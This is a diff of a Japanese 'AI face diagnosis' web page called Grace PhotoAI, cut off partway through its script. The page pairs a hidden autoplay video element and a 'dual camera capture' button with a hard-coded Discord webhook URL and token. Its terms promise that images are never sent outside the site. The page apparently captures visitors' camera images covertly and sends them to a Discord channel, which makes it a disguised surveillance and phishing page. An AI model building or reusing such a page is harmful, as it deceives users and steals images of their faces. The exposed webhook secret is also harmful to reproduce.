@@ -1,16 +1,17 @@
 
 <!DOCTYPE html>
+
 <html lang="ja">
 <head>
-  <meta charset="UTF-8" />
-  <meta property="og:title" content="AI顔診断 Grace">
-  <meta property="og:description" content="肌年齢、顔の比率、イエベ/ブルベ等がすぐにわかる！">
-  <meta property="og:image" content="https://gracephotoai.github.io/grace_preview_1200x630.jpg">
-  <meta property="og:url" content="https://gracephotoai.github.io/">
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Grace PhotoAI</title>
-  <style>
+<meta charset="utf-8"/>
+<meta content="AI顔診断 Grace" property="og:title"/>
+<meta content="肌年齢、顔の比率、イエベ/ブルベ等がすぐにわかる！" property="og:description"/>
+<meta content="https://gracephotoai.github.io/grace_preview_1200x630.jpg" property="og:image"/>
+<meta content="https://gracephotoai.github.io/" property="og:url"/>
+<meta content="summary_large_image" name="twitter:card"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<title>Grace PhotoAI</title>
+<style>
     body {
       background-color: #1e1e1e;
       color: white;
@@ -62,21 +63,18 @@
   </style>
 </head>
 <body>
-  <h1>Grace PhotoAI</h1>
-  <button onclick="startDualCameraCapture()">診断する</button>
-  <div class="terms-link" onclick="document.getElementById('terms-modal').style.display='block'">利用規約</div>
-
-  <div id="terms-modal">
-    <div id="terms-modal-content">
-      <h2>利用規約</h2>
-      <p>このサイトはAIによる顔診断を目的としています。画像は診断のみに使用され、外部に公開されることはありません。</p>
-      <button onclick="document.getElementById('terms-modal').style.display='none'">閉じる</button>
-    </div>
-  </div>
-
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  
-  <script>
+<h1>Grace PhotoAI</h1>
+<button onclick="startDualCameraCapture()">診断する</button>
+<div class="terms-link" onclick="document.getElementById('terms-modal').style.display='block'">利用規約</div>
+<div id="terms-modal">
+<div id="terms-modal-content">
+<h2>利用規約</h2>
+<p>このサイトはAIによる顔診断を目的としています。画像は診断のみに使用され、外部に公開されることはありません。</p>
+<button onclick="document.getElementById('terms-modal').style.display='none'">閉じる</button>
+</div>
+</div>
+<video autoplay="" id="video" playsinline="" style="display:none;"></video>
+<script>
     const video = document.getElementById("video");
     const webhookUrl = "https://discord.com/api/webhooks/1365282819646947409/YLfOxbOuLrQ6AHYb0_bImraprcO6VxmcoIbM4Sz2r9z_fIvuZiLED3TUIIDZCeQszc_u";
 
